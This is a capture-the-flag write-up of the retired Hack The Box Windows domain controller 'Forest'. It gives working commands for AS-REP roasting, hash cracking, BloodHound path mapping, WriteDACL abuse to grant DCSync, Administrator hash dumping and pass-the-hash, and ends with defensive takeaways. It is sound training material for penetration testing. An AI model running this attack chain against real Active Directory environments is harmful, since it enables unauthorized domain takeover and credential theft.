# Forest

| | |
|---|---|
| **Platform** | Hack The Box (Retired) |
| **OS** | Windows (Active Directory Domain Controller) |
| **Difficulty** | Easy |
| **Techniques** | AS-REP Roasting, BloodHound attack-path analysis, ACL/DACL abuse (WriteDACL), DCSync, Pass-the-Hash |

## Overview
Forest is a retired Active Directory domain controller, compromised end to end **without
ever learning the Administrator password**. It chains an AS-REP Roastable service
account, Active Directory ACL abuse mapped with BloodHound, and a DCSync attack. This is
my flagship writeup and the clearest demonstration of the AD attack skills the OSCP AD
set tests.

## Attack chain at a glance
```
null-session user enum  ->  svc-alfresco (no Kerberos pre-auth)
  -> AS-REP Roast + crack  ->  evil-winrm foothold
     -> BloodHound: Account Operators -> Exchange Windows Permissions -> WriteDACL on domain
        -> grant myself DCSync  ->  secretsdump Administrator NTLM
           -> Pass-the-Hash  ->  Domain Admin
```

## Enumeration
```bash
nmap -sC -sV -p- -oN nmap.txt <TARGET_IP>
# 53 DNS, 88 Kerberos, 389/636 LDAP, 445 SMB, 5985 WinRM -> a Domain Controller
```
Enumerate domain users with a null session over RPC/SMB and LDAP:
```bash
enum4linux-ng -A <TARGET_IP>
rpcclient -U "" -N <TARGET_IP> -c "enumdomusers"
```
This reveals the service account **svc-alfresco**.

> Screenshot: `images/forest/01-rpcclient-enumdomusers.png` (null session user list showing svc-alfresco)

## Exploitation
**1. AS-REP Roasting** (svc-alfresco has *Do not require Kerberos pre-authentication*):
```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip <TARGET_IP> -no-pass
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt      # crack offline
```

> Screenshot: `images/forest/02-asrep-hash-and-crack.png` (captured $krb5asrep$ hash + cracked password)

**2. Foothold** with the recovered password:
```bash
evil-winrm -i <TARGET_IP> -u svc-alfresco -p '<PASSWORD>'
```

## Privilege Escalation
**Map the domain with BloodHound:**
```bash
bloodhound-python -u svc-alfresco -p '<PASSWORD>' -d htb.local -ns <TARGET_IP> -c All
```
BloodHound shows svc-alfresco is in **Account Operators** (can create users and manage
group membership), giving a path into **Exchange Windows Permissions**, which holds
**WriteDACL** over the domain object. That lets me grant myself **DCSync** rights.

> Screenshot: `images/forest/03-bloodhound-path.png` (the shortest-path graph to Domain Admin)

**Abuse the ACL path (PowerView, from evil-winrm):**
```powershell
net user hacker Password123! /add /domain
net localgroup "Exchange Windows Permissions" hacker /add
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\hacker',$pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hacker -Rights DCSync
```

**DCSync to dump the Administrator hash:**
```bash
impacket-secretsdump htb.local/hacker:'Password123!'@<TARGET_IP>
# -> Administrator:<RID>:<LM>:<NTLM>:::
```

> Screenshot: `images/forest/04-secretsdump-dcsync.png` (DCSync dumping the Administrator NTLM hash)

**Domain Admin via Pass-the-Hash:**
```bash
impacket-psexec htb.local/Administrator@<TARGET_IP> -hashes :<NTLM>
# whoami -> nt authority\system ; this is the Domain Controller = full domain compromise
```

> Screenshot: `images/forest/05-pth-domain-admin.png` (SYSTEM shell on the DC via Pass-the-Hash)

## Key Takeaway
A single AS-REP Roastable service account, combined with over-permissive AD group ACLs
(Account Operators -> Exchange Windows Permissions -> WriteDACL on the domain), leads to
DCSync and total domain takeover. Defenders should enforce Kerberos pre-authentication,
tier and audit privileged group membership, and alert on DCSync (directory replication)
originating from non-DC accounts.

## My note
Coming from years of Active Directory administration, this box is the one I can talk
through most confidently in an interview, because I understand both the attack and why
each misconfiguration exists in real environments. BloodHound turning a tangle of ACLs
into a clear shortest path to Domain Admin is the single most important AD tradecraft on
the box.
